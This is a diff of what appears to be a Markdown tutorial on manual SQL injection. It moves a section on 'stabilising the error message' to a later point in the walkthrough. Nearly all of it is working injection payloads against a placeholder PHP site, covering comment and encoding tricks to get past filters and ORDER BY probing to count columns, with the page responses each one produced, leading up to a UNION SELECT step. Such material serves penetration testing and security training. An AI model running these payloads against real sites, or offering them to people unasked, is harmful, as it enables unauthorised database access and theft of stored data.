@@ -102,15 +102,6 @@ http://domain.com/index.php?id=1/*!f****U%0d%0a+order+by+*/1-- -
       - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
       - Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)
 
-## Stabilise the error message
-Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  
-
-```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
-```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
-```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
-```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
-```http://domain.com/index.php?id=1') order by 1-- - ```  no error
-
 In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up: 
 
 ```http://domain.com/index.php?id=1 order by 1-- -``` no error  
@@ -121,6 +112,15 @@ In this case, the payload ```?id=1 order by 1-- -``` worked and website loads su
 ```Unknown column '5' in 'order clause'Unknown column '5' in 'order clause'```  
 
 This means there are only 4 columns. Now we have to find which one of these 4 columns have information.  
+
+## Stabilise the error message
+Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  
+
+```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
+```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
+```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
+```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
+```http://domain.com/index.php?id=1') order by 1-- - ```  no error  
 
 ## Find the vulnerable column where information are stored using 'UNION SELECT' query  
 
